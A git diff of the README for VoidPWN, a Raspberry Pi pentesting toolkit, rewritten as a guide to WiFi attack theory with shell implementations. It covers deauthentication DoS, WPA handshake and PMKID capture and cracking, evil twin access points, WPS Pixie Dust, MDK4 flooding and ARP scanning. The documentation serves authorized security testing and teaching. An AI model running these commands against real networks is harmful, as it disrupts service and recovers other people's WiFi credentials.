@@ -1,363 +1,964 @@
-<h1 align="center">
-  <img src="https://socialify.git.ci/void0x11/VoidPWN/image?description=1&descriptionEditable=Cyberpunk%20%26%20Watch%20Dogs%20Themed%20CtOS%20Breach%20Framework&font=Inter&name=1&owner=1&pattern=Circuit%20Board&theme=Dark" width="100%" alt="VoidPWN Logo">
-</h1>
+# VoidPWN - Portable Pentesting Device
 
-<p align="center">
-  <img src="assets/Gemini_Generated_Image_ubqnxrubqnxrubqn.png" width="100%" alt="VoidPWN Hardware Platform">
-</p>
+> **⚠️ DISCLAIMER:** This tool is for **authorized security testing and educational purposes only**. Unauthorized access to computer systems is illegal. Always obtain explicit written permission before testing any network or system you don't own.
 
-<p align="center">
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="License: MIT"></a>
-  <a href="https://www.raspberrypi.org/"><img src="https://img.shields.io/badge/Platform-Raspberry%20Pi-red.svg" alt="Platform: Raspberry Pi"></a>
-  <a href="https://www.python.org/"><img src="https://img.shields.io/badge/Python-3.8%2B-green.svg" alt="Python: 3.8+"></a>
-  <img src="https://img.shields.io/badge/Focus-Hardware%20Security-blue.svg" alt="Focus: Hardware Security">
-  <img src="https://img.shields.io/badge/Type-Pentesting%20Framework-orange.svg" alt="Type: Pentesting Framework">
-</p>
+```
+╦  ╦┌─┐┬┌┬┐╔═╗╦ ╦╔╗╔
+╚╗╔╝│ ││││ ││╠═╝║║║║║║
+ ╚╝ └─┘┴└─┘┴╩  ╚╩╝╝╚╝
+═══════════════════════
+Portable Pentesting Device
+by void0x11
+```
 
-<p align="center">
-  <img src="assets/Pi-Isometricv2.jpg" width="100%" alt="VoidPWN Hardware Isometric View">
-</p>
+## Table of Contents
 
-<p align="center">
-  <b>VoidPWN</b> is a high-performance, mobile-optimized Command-and-Control (C2) framework engineered for <b>Hardware Security Assessments</b> and <b>Enterprise Network Auditing</b>. It streamlines complex network discovery and wireless security assessments by consolidating advanced audit vectors into a unified Raspberry Pi hardware platform.
-</p>
-
+1. [Overview](#overview)
+2. [Architecture](#architecture)
+3. [WiFi Attack Theory & Implementation](#wifi-attack-theory--implementation)
+   - [Monitor Mode](#monitor-mode)
+   - [Deauthentication Attack](#deauthentication-attack)
+   - [WPA Handshake Capture](#wpa-handshake-capture)
+   - [WPA Handshake Cracking](#wpa-handshake-cracking)
+   - [PMKID Attack (Clientless)](#pmkid-attack-clientless)
+   - [Evil Twin Attack](#evil-twin-attack)
+   - [WPS Pixie Dust Attack](#wps-pixie-dust-attack)
+   - [Beacon Flooding (MDK4)](#beacon-flooding-mdk4)
+   - [Authentication Flooding (MDK4)](#authentication-flooding-mdk4)
+4. [Network Reconnaissance Theory](#network-reconnaissance-theory)
+   - [ARP Scanning](#arp-scanning)
+   - [Port Scanning (Nmap)](#port-scanning-nmap)
+   - [Stealth Scanning](#stealth-scanning)
+   - [Vulnerability Scanning](#vulnerability-scanning)
+   - [SMB Enumeration](#smb-enumeration)
+   - [DNS Enumeration](#dns-enumeration)
+   - [Web Enumeration](#web-enumeration)
+5. [Man-in-the-Middle Attacks](#man-in-the-middle-attacks)
+   - [ARP Spoofing](#arp-spoofing)
+   - [Bandwidth Throttling](#bandwidth-throttling)
+6. [Python Tools](#python-tools)
+   - [Smart Scanner](#smart-scanner)
+   - [Packet Visualizer](#packet-visualizer)
+   - [WiFi Monitor](#wifi-monitor)
+7. [Password Attacks](#password-attacks)
+8. [Exploitation Tools](#exploitation-tools)
+9. [Automated Attack Scenarios](#automated-attack-scenarios)
+10. [Web Dashboard](#web-dashboard)
+11. [Commands Reference](#commands-reference)
 
 ---
 
-## 🏗️ Full-Stack System Architecture
+## Overview
 
-VoidPWN is engineered as a **Modular Security Orchestrator**, decoupling the high-level Command & Control (C2) interface from the underlying execution engines and hardware abstraction layers. The system integrates over 20+ specialized security tools into a unified, automated framework.
+VoidPWN is a comprehensive pentesting toolkit designed for portable deployment on Raspberry Pi devices with external WiFi adapters. It provides an interactive terminal-based menu system and a web-based dashboard for executing various offensive security operations.
 
-### [ SYSTEM_SCHEMATIC ]
-```mermaid
-graph TD
-    subgraph "Layer 4: Presentation (UI/UX)"
-        WEB[Web Dashboard - Flask/Jinja2]
-        DSH[TFT Live HUD - Mobile Viewport]
-        CLI[Terminal Interactive CLI - Bash]
-    end
+### Key Capabilities:
+- **WiFi Attacks**: Packet injection, deauthentication, handshake capture, PMKID attacks, Evil Twin
+- **Network Reconnaissance**: Automated scanning, enumeration, vulnerability detection
+- **MITM Attacks**: ARP spoofing, traffic interception, bandwidth throttling
+- **Password Cracking**: Aircrack-ng, John the Ripper, Hashcat integration
+- **Exploitation**: Metasploit, SQLMap, Responder, Bettercap
 
-    subgraph "Layer 3: Logic & Orchestration"
-        SVR[Flask C2 API Server]
-        IPC[Subprocess Manager - stdbuf/asyncio]
-        PAR[Telemetry Engine - Regex/XML Parsing]
-        DEV[Device Intel DB - JSON Persistence]
-    end
+---
 
-    subgraph "Layer 2: Execution Engines"
-        direction TB
-        subgraph "Wireless Arsenal"
-            AIR[Aircrack-ng Suite - Monitor/Inject]
-            WFT[Wifite - Automated Audit]
-            MDK[MDK4 - Beacon Operations]
-            HCX[hcxdumptool - PMKID Stub]
-            WPS[Reaver/PixieWPS - WPS Audit]
-            ETW[Wifiphisher/Fluxion - AP Sim]
-        end
-        subgraph "Network Intel"
-            NMP[Nmap + NSE - Discovery/Vuln]
-            ARP[arp-scan - L2 Discovery]
-            GOB[GoBuster - Web Enum]
-            SMB[enum4linux/smbclient - SMB Enum]
-            DNS[dig/nslookup - DNS Enum]
-        end
-    end
+## Architecture
 
-    subgraph "Layer 1: System Infrastructure"
-        KRN[Linux Kernel 6.x - nl80211 Stack]
-        DRV_RF[Driver: rtl88xxau - Injection]
-        DRV_IO[Driver: LCD-show - SPI Inteface]
-        SVC[fbcp - Framebuffer Mirroring]
-    end
-
-    subgraph "Layer 0: Physical Hardware"
-        SOC[RPi 4B - BCM2711 Cortex-A72]
-        RF[Alfa AWUS036ACH - Realtek 8812AU]
-        DIS[Waveshare 3.5' TFT - 480x320]
-        PWR[PiSugar/PMIC - 5V/3A Power]
-        SPI_BUS[SPI Bus - High Speed Data]
-        USB_BUS[USB 3.0 - High Throughput RF]
-    end
-
-    %% Flow Connections
-    WEB <-->|REST/SSE| SVR
-    DSH <-->|Render| SVC
-    SVR -->|Spawn| IPC
-    IPC --> AIR & WFT & NMP & GOB
-    AIR & WFT --> DRV_RF
-    NMP & SMB --> KRN
-    DRV_RF <-->|Data| USB_BUS
-    USB_BUS <-->|Signal| RF
-    SVC --> DRV_IO
-    DRV_IO <-->|Pixel Data| SPI_BUS
-    SPI_BUS <-->|IO| DIS
-    SOC --> USB_BUS & SPI_BUS
+```
+VoidPWN/
+├── voidpwn.sh              # Main interactive menu (entry point)
+├── scripts/
+│   ├── core/               # System scripts (setup, LCD, diagnostics)
+│   ├── network/            # Attack and recon scripts
+│   │   ├── wifi_tools.sh   # WiFi attack automation
+│   │   ├── recon.sh        # Network reconnaissance
+│   │   ├── scenarios.sh    # Pre-configured attack workflows
+│   │   └── wifi_throttle.sh # ARP spoofing + bandwidth limiting
+│   └── python/             # Python-based tools
+│       ├── smart_scan.py   # Intelligent auto-enumeration
+│       ├── packet_visualizer.py  # Matrix-style traffic display
+│       └── wifi_monitor.py # Probe request monitoring
+├── dashboard/              # Web-based control interface
+│   ├── server.py           # Flask API backend
+│   ├── index.html          # Frontend UI
+│   └── app.js              # Frontend JavaScript
+└── output/                 # Captured data & logs
+    ├── captures/           # WiFi handshakes, packets
+    └── recon/              # Scan results
 ```
 
-### [ TECHNICAL_LAYER_SPECIFICATIONS ]
+---
 
-| Layer | Component | Integrated Tooling & Technologies |
-| :--- | :--- | :--- |
-| **L4: Presentation** | **Dashboard** | Python Flask, Jinja2, Socket.IO, Vanilla JS, CSS3 Grid |
-| | **CLI** | Bash 5.0+, Interactive Menu System, Colorized Output |
-| **L3: Orchestration** | **Process Mgmt** | `subprocess` (Python), `stdbuf` (Unbuffered I/O), `collections.deque` |
-| | **Data Parsing** | Regex Heuristics (Live Stream), `xml.etree` (Nmap XML), `json` |
-| **L2: Execution** | **Wireless** | `aircrack-ng`, `aireplay-ng`, `airodump-ng`, `wifite`, `mdk4`, `hcxdumptool`, `reaver`, `pixiewps`, `macchanger` |
-| | **Network** | `nmap` (NSE), `gobuster`, `enum4linux`, `smbclient`, `arp-scan`, `dirb`, `tshark` |
-| **L1: Infrastructure** | **Drivers** | `88xxau-dkms` (Monitor Mode), `LCD-show` (SPI), `fbcp` (Display Mirroring) |
-| | **OS/Kernel** | Kali Linux / Raspberry Pi OS (Debian 12 Bookworm), Kernel 6.x |
-| **L0: Physical** | **Compute** | **Raspberry Pi 4B**: Broadcom BCM2711, Quad-core Cortex-A72 (ARM v8) 64-bit SoC @ 1.5GHz |
-| | **RF Interface** | **Alfa AWUS036ACH**: Realtek RTL8812AU Chipset, USB 3.0, Dual-Band 2.4/5GHz, High-Gain Antennas |
-| | **Display** | **Waveshare 3.5" TFT**: SPI Interface (MHz), XPT2046 Touch Controller |
-| | **Power** | **PiSugar / UPS**: I2C Battery Monitoring, 5V/3A Output Regulation via USB-C |
+## WiFi Attack Theory & Implementation
 
-### [ RF_PHYSICAL_LAYER_ANALYSIS ]
+### Monitor Mode
 
-VoidPWN operates at the **Layer 0 (Physical)** and **Layer 1 (Data Link)** intersection, manipulating raw 802.11 frames directly from the air interface. The following schematic illustrates the bidirectional signal mechanics between the VoidPWN engine and the target infrastructure.
+**Theory:**
+Wireless network interface cards (NICs) typically operate in **managed mode**, where they only process packets destined for their MAC address. **Monitor mode** allows the NIC to capture ALL 802.11 frames in the air, regardless of destination—essential for wireless auditing.
 
-```mermaid
-sequenceDiagram
-    participant Target as 🎯 Target Network
-    participant Air as 🌊 RF Spectrum (Air Interface)
-    participant Ant as 📡 High-Gain Antenna
-    participant PHY as 🎛️ RTL8812AU (PHY/MAC)
-    participant Drv as 🔌 Driver (88xxau)
-    participant Void as 👾 VoidPWN Engine
+**How it works:**
+```bash
+# The airmon-ng tool reconfigures the wireless interface
+airmon-ng start wlan1     # Creates wlan1mon interface
+```
 
-    Note over Target, Void: 🟡 RX PATH: Monitor Mode (Passive Intelligence)
-    Target->>Air: 802.11 Beacon Frames (100ms)
-    Target->>Air: Data Packets / Probes
-    Air->>Ant: RF Signal (2.412 GHz / 5 GHz)
-    Ant->>PHY: Analog Carrier Wave
-    PHY->>Drv: Demodulation (ADC/OFDM)
-    Drv->>Void: Radiotap Header + 802.11 Frame
-    Void->>Void: Regex Analysis (Identify Target)
-
-    Note over Target, Void: 🔴 TX PATH: Active Injection (Attack Vector)
-    Void->>Drv: Construct Deauth Packet (Reason: 7)
-    Drv->>PHY: Frame -> IQ Samples
-    PHY->>Ant: Modulation (CCK/OFDM via DAC)
-    Ant->>Air: High-Power Injection (30dBm)
-    Air->>Target: Deauthentication Frame
-    Target->>Target: Connection Drop (DoS)
+**Implementation in VoidPWN:**
+```bash
+# wifi_tools.sh - enable_monitor_mode()
+enable_monitor_mode() {
+    # Kill interfering processes (NetworkManager, wpa_supplicant)
+    airmon-ng check kill
     
-    Note over Target, Void: 🟢 HANDSHAKE CAPTURE
-    Target->>Air: EAPOL 4-Way Handshake (Reconnection)
-    Air->>Ant: Capture Transient Frames
-    Ant->>PHY: Standard RX Path
-    PHY->>Void: Save to .cap (PMKID/MIC Extraction)
+    # Start monitor mode
+    airmon-ng start "$INTERFACE"
+    
+    # Alternative manual method if airmon-ng fails:
+    ifconfig "$INTERFACE" down
+    iwconfig "$INTERFACE" mode monitor
+    ifconfig "$INTERFACE" up
+}
 ```
 
-**Signal Processing Mechanics:**
-1.  **Signal Acquisition (RX)**: The **RTL8812AU** chipset operates in *Promiscuous Monitor Mode*, bypassing standard MAC filtering to capture all raw 802.11 frames within the antenna's sensitivity range.
-2.  **Demodulation**: Physical signals (OFDM for 802.11ac, CCK for 802.11b) are converted by the PHY's **ADC (Analog-to-Digital Converter)** into digital baseband signals.
-3.  **Injection (TX)**: For active attacks (Deauth/Beacon Flood), the engine bypasses the kernel's regulatory domain constraints to drive the amp at **30dBm (1000mW)**, saturating the local air interface to ensure frame delivery.
-
-
-### [ SYSTEM_LIFECYCLE_LOGIC ]
-The workflow for a standard security assessment (e.g., "Network Reconnaissance") across the stack:
-
-```mermaid
-sequenceDiagram
-    participant Res as Security Researcher
-    participant API as Flask C2 API
-    participant Proc as Subprocess (stdbuf)
-    participant Thread as Log Capture Thread
-    participant Intel as Regex Heuristics
-    participant HUD as Live Interface
-
-    Security Researcher->>API: POST /api/action/recon
-    API->>Proc: Spawn Binary (unbuffered)
-    API-->>Security Researcher: Returns PID/Success
-    loop Stream Execution
-        Proc->>Thread: Raw stdout line
-        Thread->>Intel: Pass line for analysis
-        Intel->>Intel: Match IP/MAC patterns
-        Intel-->>API: Update Inventory DB
-        Thread->>HUD: Push to circular log back-end
-        HUD-->>Security Researcher: SSE/Poll update
-    end
-    Proc->>API: Process Exit (Code 0)
-    API-->>Security Researcher: Broadcast Assessment Complete
+**Commands:**
+```bash
+sudo ./scripts/network/wifi_tools.sh --monitor-on   # Enable
+sudo ./scripts/network/wifi_tools.sh --monitor-off  # Disable
 ```
 
 ---
 
-## 🔬 Engineering & Technical Implementation
+### Deauthentication Attack
 
-### Asynchronous C2 Orchestration
-VoidPWN utilizes a **Threaded Producer-Consumer** pattern for efficient process management. By leveraging `stdbuf -oL`, the framework forces binaries such as `nmap` and `airodump-ng` to bypass standard memory buffering. this enables **millisecond-latency interface updates**, providing real-time visibility into long-running assessment processes.
+**Theory:**
+802.11 management frames (including deauthentication frames) are **not authenticated** in WPA/WPA2. An attacker can forge deauth frames appearing to come from the Access Point, forcing clients to disconnect. This is used to:
 
-### Real-time Intelligence Extraction
-The framework incorporates a **Regex-based Heuristic Engine** (`parse_inventory_info`) that audits live process output in real-time to identify:
-- **Network Topology Artifacts**: Automatically populating the host inventory from active scanning results.
-- **Physical Device Signatures**: Extracting MAC addresses and BSSID identifiers for localized device tracking.
+1. **Capture WPA handshakes** - Force clients to reconnect and capture the 4-way handshake
+2. **Denial of Service** - Prevent clients from connecting
+3. **Force clients to Evil Twin** - Disconnect from legitimate AP, connect to rogue
 
-### Hardware Abstraction Layer
-The display engine facilitates dynamic switching between the HDMI output and the SPI-based TFT interface. This is achieved through direct modification of the `/boot/config.txt` parameters and re-initialization of the `fbcp` (framebuffer copy) service, enabling seamless transitions between portable and workstation-based operational modes.
+**The 802.11 Deauth Frame Structure:**
+```
+┌─────────────────────────────────────────┐
+│ Frame Control │ Duration │ DA │ SA │ BSSID │ Seq │ Reason Code │
+└─────────────────────────────────────────┘
+- DA: Destination Address (victim client or broadcast)
+- SA: Source Address (spoofed AP MAC)
+- BSSID: AP's MAC address
+- Reason Code: 0x07 (Class 3 frame from non-associated station)
+```
 
----
+**Implementation:**
+```bash
+# wifi_tools.sh - deauth_attack()
+deauth_attack() {
+    local bssid="$1"      # Target AP MAC address
+    local count="${2:-0}" # Number of deauth packets (0 = continuous)
+    
+    # -D: Skip AP detection (avoids errors with some cards)
+    # --ignore-negative-one: Fixes channel -1 issues
+    aireplay-ng --deauth "$count" -a "$bssid" -D --ignore-negative-one "$MONITOR_INTERFACE"
+}
+```
 
-## 💻 Cross-Platform Operational Interface
-VoidPWN provides a responsive, web-based Command-and-Control interface accessible across diverse hardware stacks. Researchers can manage assessments from a **Raspberry Pi TFT**, a **Standard Workstation**, or a **Mobile Device** with full real-time synchronization.
+**Commands:**
+```bash
+# Send 10 deauth packets to specific AP
+sudo ./scripts/network/wifi_tools.sh --deauth AA:BB:CC:DD:EE:FF 10
 
-<p align="center">
-  <img src="assets/phone.jpeg" width="300" alt="Mobile Dashboard Telemetry">
-  <br>
-  <i>Synchronized mobile interface showing real-time system logs and process telemetry.</i>
-</p>
-
-### 🛡️ Network Infrastructure Enumeration
-Deploy sophisticated **Nmap** profiles for rapid host discovery and network mapping. Integrated OS fingerprinting and service discovery provide comprehensive situational awareness during internal security audits.
-<p align="center">
-  <img src="assets/Net-Discovery.jpeg" width="85%" alt="Network Reconnaissance">
-</p>
-
-### 📡 Wireless Security Suite
-Execute advanced wireless assessment vectors including **WPA/WPA2 Handshake capture**, **PMKID extraction**, and **Authorized Rogue AP** simulations. Optimized for auditing protocol resilience and credential management.
-<p align="center">
-  <img src="assets/attack.png" width="85%" alt="Wireless Security Assessment">
-</p>
-
-### 📊 Real-time Assessment Logs
-Monitor long-running processes through the **Live Interface**, featuring synchronized log streaming. Post-assessment analysis is facilitated through comprehensive, exportable session reports.
-<p align="center">
-  <img src="assets/Report&Logging.jpeg" width="85%" alt="System Logs">
-</p>
-
-### [ SYSTEM_MODALITIES ]
-*   **INFRA_RECON**: Automated network mapping and host profiling.
-*   **WIRELESS_AUDIT**: WPA/WPA2 protocol resilience and handshake acquisition.
-*   **AUTOMATED_ASSESSMENT**: Condition-based security sequences for rapid auditing.
-*   **REMOTE_C2**: Web-integrated telemetry and remote platform management.
+# Continuous deauth (DoS)
+sudo ./scripts/network/wifi_tools.sh --deauth AA:BB:CC:DD:EE:FF 0
+```
 
 ---
 
-## 🔬 Assessment Methodologies
+### WPA Handshake Capture
 
-### [ RECON_LOGIC ]
-VoidPWN utilizes optimized **Nmap T3/T4** profiles for thorough perimeter analysis. Assessment phases include:
-1. **Network Discovery**: ICMP/ARP sweeps for inventory building via `nmap -sn`.
-2. **Service Enumeration**: Comprehensive version detection (`-sV`) and OS fingerprinting (`-O`).
-3. **Vulnerability Mapping**: Targeted NSE (Nmap Scripting Engine) execution for known service weaknesses.
-4. **Web Recon**: Directory and asset discovery using **GoBuster**.
+**Theory:**
+WPA/WPA2 uses a **4-way handshake** to establish encryption keys:
 
-### [ WIRELESS_SECURITY_LOGIC ]
-The wireless assessment engine automates the 802.11 audit lifecycle:
-*   **WPA/WPA2 Resilience**: Automated handshake acquisition via `airodump-ng` and `aireplay-ng`.
-*   **Clientless PMKID**: Targeted RSN audit using `hcxdumptool` to bypass deauthentication needs.
-*   **WPS Auditing**: Online and offline (Pixie-Dust) brute-force via `reaver`.
-*   **Protocol Stress-Testing**: High-volume Beacon and Auth flooding using `mdk4`.
-*   **Authorized Rogue AP**: Deployment of test-specific access points using `airbase-ng` or `wifiphisher`.
+```
+Client                                AP
+   │                                   │
+   │◄────── ANonce (Authenticator Nonce)
+   │                                   │
+   │────── SNonce + MIC ──────────────►│  (Message 2)
+   │                                   │
+   │◄────── GTK + MIC                  │  (Message 3)
+   │                                   │
+   │────── ACK ───────────────────────►│  (Message 4)
+```
 
----
+The **Pairwise Transient Key (PTK)** is derived from:
+```
+PTK = PRF(PMK, "Pairwise key expansion", Min(AA,SA) || Max(AA,SA) || Min(ANonce,SNonce) || Max(ANonce,SNonce))
 
-## ⚒️ Security Assessment Capabilities
+Where:
+- PMK = PBKDF2(passphrase, SSID, 4096, 256)  # Pre-shared key derivation
+- AA = AP MAC address
+- SA = Client MAC address
+- ANonce, SNonce = Random values from handshake
+```
 
-### Network Intelligence
-*   **Service Analysis**: Automated host discovery and infrastructure profiling.
-*   **Stealth Scanning**: Fragmented packet headers (`-f`) and decoy traffic (`-D`) to evade IDS/IPS.
-*   **Artifact Extraction**: Direct parsing of Nmap XML results into the unified inventory.
+To crack the password, we need **Messages 1 & 2 (or 2 & 3)** from the handshake.
 
-### Wireless Research
-*   **Automated Auditing**: **Wifite**-powered workflows for streamlined protocol testing.
-*   **Cracking Integration**: Ready-to-crack `.cap` and `.pcapng` export for **Hashcat/John**.
-*   **Spectrum Analysis**: Real-time monitoring of signal density and target metadata.
+**Implementation:**
+```bash
+# wifi_tools.sh - capture_handshake()
+capture_handshake() {
+    local bssid="$1"
+    local channel="$2"
+    
+    # Lock interface to target channel
+    iwconfig "$MONITOR_INTERFACE" channel "$channel"
+    
+    # Start capturing on target network
+    airodump-ng -c "$channel" --bssid "$bssid" -w "$output_file" "$MONITOR_INTERFACE" &
+    
+    # Force client reconnection to capture handshake
+    aireplay-ng --deauth 10 -a "$bssid" -D --ignore-negative-one "$MONITOR_INTERFACE"
+}
+```
 
-### Automation & Workflows
-*   **Rapid Audit**: Pre-configured network assessment routines (~5 minutes).
-*   **Condition-Based Sequences**: Sequential attacks (e.g., Scan -> Identify -> Deauth -> Capture) via `scenarios.sh`.
-*   **Remote C2**: Web-integrated telemetry and remote platform management.
-
----
-
-## Hardware & Deployment
-
-### Recommended Physical Specification
-| Component | Specification | Technical Detail |
-| :--- | :--- | :--- |
-| **SBC** | Raspberry Pi 4B (4GB/8GB) | SoC: BCM2711 (Quad-core Cortex-A72) |
-| **Radio (Primary)** | Alfa AWUS036ACH | Chipset: RTL8812AU (Injection + Monitor Mode) |
-| **Display Interface** | Waveshare 3.5" TFT | Connection: SPI (GPIO Header), Resolution: 480x320 |
-| **Storage** | 32GB+ UHS-I microSD | Endurance rating: 100MB/s+ for high-speed logging |
-| **Management RF** | Built-in RPi WiFi | Dedicated wlan0 for C2 Dashboard access |
-| **Power Management** | PiSugar 2/3 (Optional) | Integrated UPS for portable field operations |
-
-### [ SYSTEM_INITIALIZATION ]
-
-1. **PROVISION_FILES**:
-   ```bash
-   # Clone security framework
-   git clone https://github.com/void0x11/VoidPWN.git && cd VoidPWN
-   ```
-2. **RESOLVE_DEPENDENCIES**:
-   ```bash
-   # Deployment of core security engines and hardware drivers
-   sudo ./scripts/core/setup.sh
-   sudo ./scripts/core/install_lcd.sh
-   ```
-3. **START_FRAMEWORK**:
-   ```bash
-   # Initializing the C2 Dashboard
-   cd dashboard && sudo python3 server.py
-   ```
+**Commands:**
+```bash
+# Capture handshake from specific AP on channel 6
+sudo ./scripts/network/wifi_tools.sh --handshake AA:BB:CC:DD:EE:FF 6
+```
 
 ---
 
-## 📚 Documentation
+### WPA Handshake Cracking
 
-### User Guides
-- **[Operation Manual](./USER_GUIDE.md)**: Comprehensive guide for security researchers.
-- **[Hardware Setup](./docs/HARDWARE_SETUP.md)**: Detailed hardware assembly and configuration.
+**Theory:**
+Once we have the 4-way handshake in a `.cap` file, we perform an **offline dictionary attack**:
 
-### Feature Documentation
-- **[Feature Catalog](./docs/FEATURE_GUIDE.md)**: In-depth technical breakdown of every module.
-- **[WiFi Methodologies](./docs/WIFI_ARSENAL.md)** / **[Recon Techniques](./docs/NETWORK_INTEL.md)**.
-- **[Scenario Guide](./docs/SCENARIO_GUIDE.md)**: Automated workflow documentation.
+1. Take a candidate password from wordlist
+2. Compute `PMK = PBKDF2(password, SSID, 4096, 256)`
+3. Compute PTK using PMK + handshake nonces + MAC addresses
+4. Compute MIC (Message Integrity Code) from PTK
+5. Compare computed MIC with captured MIC
+6. If match → **password found**
 
-### Technical Reference
-- **[Architecture & Design](./docs/TECHNICAL_REFERENCE.md)**: System internals and component orchestration.
-- **[Attack Catalog](./docs/ATTACK_REFERENCE.md)**: Details on implemented attack vectors.
+**Speed bottleneck:** PBKDF2 requires 4096 SHA-1 iterations per password, making this CPU/GPU intensive.
 
----
+**Implementation:**
+```bash
+# wifi_tools.sh - crack_handshake()
+crack_handshake() {
+    local cap_file="$1"
+    local wordlist="${2:-/usr/share/wordlists/rockyou.txt}"
+    
+    aircrack-ng -w "$wordlist" "$cap_file"
+}
+```
 
-## Quick Example
+**Alternative with Hashcat (GPU-accelerated):**
+```bash
+# Convert .cap to .hc22000 format
+hcxpcapngtool -o hash.hc22000 capture.cap
 
-### Running a WiFi Handshake Capture
+# Crack with GPU
+hashcat -m 22000 hash.hc22000 wordlist.txt
+```
 
-1. **Navigate to Wireless tab**.
-2. **Initialize Spectrum Refresh** to identify target access points.
-3. **Select target network** for assessment.
-4. **Initialize Handshake Acquisition** to start the capture process.
-5. **Monitor Telemetry** in the Live Interface.
-6. **View results** in the Reports tab.
-
----
-
-## Legal & Ethical Compliance
-**VoidPWN is security research platform.** Use is permitted only on infrastructure where the operator has explicit, written authorization. All data gathered must be handled according to local data protection laws. The developers assume no liability for unauthorized or misuse of this software.
-
----
-
-## License
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## Maintainer
-**void0x11** - [GitHub Profile](https://github.com/void0x11) | Research and Development for Advanced Security Auditing.
+**Commands:**
+```bash
+sudo ./scripts/network/wifi_tools.sh --crack ~/captures/handshake-01.cap
+```
 
 ---
 
-## Acknowledgments
-- **Aircrack-ng Suite**: Wireless security assessment tools.
-- **Nmap Project**: Network discovery and security auditing.
-- **Reaver/Pixiewps**: WPS vulnerability research.
-- **Wifite**: Automated wireless auditing framework.
-- **Flask**: Python web framework.
-- **Raspberry Pi Foundation**: Affordable computing platform.
+### PMKID Attack (Clientless)
+
+**Theory:**
+Discovered in 2018, PMKID attack captures the **PMK Identifier** from the AP's **RSN IE** (Robust Security Network Information Element) in the first message of the handshake. This eliminates the need to wait for a client to connect.
+
+**PMKID Calculation:**
+```
+PMKID = HMAC-SHA1-128(PMK, "PMK Name" || MAC_AP || MAC_Client)
+```
+
+Since we know the PMKID, AP MAC, and our MAC, we can brute-force the PMK (derived from password).
+
+**Advantages:**
+- No clients needed on the network
+- Works against WPA/WPA2-PSK networks
+- Faster than traditional handshake capture
+
+**Implementation:**
+```bash
+# wifi_tools.sh - pmkid_capture()
+pmkid_capture() {
+    local duration="${2:-300}"  # 5 minutes default
+    
+    # hcxdumptool captures PMKID from AP's beacon/probe responses
+    timeout "$duration" hcxdumptool -o "$output_pcapng" -i "$interface" --enable_status=1
+    
+    # Convert to hashcat format
+    hcxpcapngtool -o hash.hc22000 "$output_pcapng"
+}
+```
+
+**Commands:**
+```bash
+sudo ./scripts/network/wifi_tools.sh --pmkid 300   # Capture for 5 minutes
+```
 
 ---
 
-*This project is developed for authorized security assessments and educational purposes.*
+### Evil Twin Attack
+
+**Theory:**
+An Evil Twin is a rogue Access Point that impersonates a legitimate network. The attack flow:
+
+```
+1. Clone legitimate AP's SSID
+2. Broadcast fake AP on same or adjacent channel
+3. Deauth clients from real AP
+4. Clients connect to Evil Twin (stronger signal)
+5. Attacker captures credentials or performs MITM
+```
+
+**Attack Variations:**
+- **Captive Portal**: Present fake login page to capture credentials
+- **SSL Stripping**: Downgrade HTTPS to HTTP
+- **DNS Spoofing**: Redirect traffic to malicious servers
+
+**Implementation:**
+```bash
+# wifi_tools.sh - evil_twin()
+evil_twin() {
+    local ssid="$1"
+    local channel="${2:-6}"
+    
+    # Check for advanced tools
+    if command -v wifiphisher &> /dev/null; then
+        wifiphisher --essid "$ssid"  # Advanced captive portal attack
+        return
+    fi
+    
+    # Fallback: Basic soft AP with airbase-ng
+    airbase-ng -e "$ssid" -c "$channel" "$MONITOR_INTERFACE"
+}
+```
+
+**Commands:**
+```bash
+sudo ./scripts/network/wifi_tools.sh --evil-twin "Free WiFi" 6
+```
+
+---
+
+### WPS Pixie Dust Attack
+
+**Theory:**
+WPS (WiFi Protected Setup) has a vulnerability in the "External Registrar" mode. The **Pixie Dust attack** exploits weak random number generation in the **WPS exchange**.
+
+The WPS protocol uses two random numbers (**E-S1** and **E-S2**) to protect the PIN. If these are predictable (weak RNG), we can derive the PIN without brute-forcing.
+
+**Attack Process:**
+```
+1. Initiate WPS exchange with AP
+2. Capture E-Hash1, E-Hash2, PKE, PKR
+3. If E-S1/E-S2 are weak (predictable), solve offline
+4. Recover WPS PIN → Get WPA passphrase
+```
+
+**Implementation:**
+```bash
+# wifi_tools.sh - wps_pixie_dust()
+wps_pixie_dust() {
+    local bssid="$1"
+    
+    # reaver with Pixie Dust mode (-K 1)
+    reaver -i "$interface" -b "$bssid" -K 1 -vv
+}
+```
+
+**Commands:**
+```bash
+sudo ./scripts/network/wifi_tools.sh --pixie AA:BB:CC:DD:EE:FF
+```
+
+---
+
+### Beacon Flooding (MDK4)
+
+**Theory:**
+Access Points broadcast **beacon frames** (~10 per second) announcing their presence. MDK4 floods the airspace with thousands of fake beacon frames, causing:
+
+- **Client confusion**: Devices see hundreds of fake networks
+- **Network scanners overwhelmed**: Cannot find real networks
+- **Denial of Service**: Some devices freeze trying to process beacons
+
+**Implementation:**
+```bash
+# wifi_tools.sh - mdk4_beacon_flood()
+mdk4_beacon_flood() {
+    # Random SSIDs generated
+    mdk4 "$interface" b
+    
+    # Or use custom SSID list
+    mdk4 "$interface" b -f ssid_list.txt
+}
+```
+
+**Commands:**
+```bash
+sudo ./scripts/network/wifi_tools.sh --beacon           # Random SSIDs
+sudo ./scripts/network/wifi_tools.sh --beacon list.txt  # Custom list
+```
+
+---
+
+### Authentication Flooding (MDK4)
+
+**Theory:**
+By sending thousands of fake **authentication requests** to an AP, we can exhaust its client table (Association ID pool), preventing legitimate clients from connecting.
+
+**Implementation:**
+```bash
+# wifi_tools.sh - mdk4_auth_flood()
+mdk4_auth_flood() {
+    if [[ -n "$bssid" ]]; then
+        mdk4 "$interface" a -a "$bssid"  # Target specific AP
+    else
+        mdk4 "$interface" a              # All APs in range
+    fi
+}
+```
+
+**Commands:**
+```bash
+sudo ./scripts/network/wifi_tools.sh --auth AA:BB:CC:DD:EE:FF
+```
+
+---
+
+## Network Reconnaissance Theory
+
+### ARP Scanning
+
+**Theory:**
+ARP (Address Resolution Protocol) maps IP addresses to MAC addresses. Since ARP requests are broadcast on Layer 2, we can discover all hosts on a subnet by sending ARP requests to every IP.
+
+**Advantages over ICMP ping:**
+- Works even if ICMP is blocked by firewall
+- Faster for local network discovery
+- Reveals MAC addresses (useful for OS fingerprinting)
+
+**Implementation:**
+```bash
+# recon.sh - arp_scan_network()
+arp_scan_network() {
+    local interface=$(ip route | grep default | awk '{print $5}')
+    arp-scan --interface="$interface" --localnet
+}
+```
+
+---
+
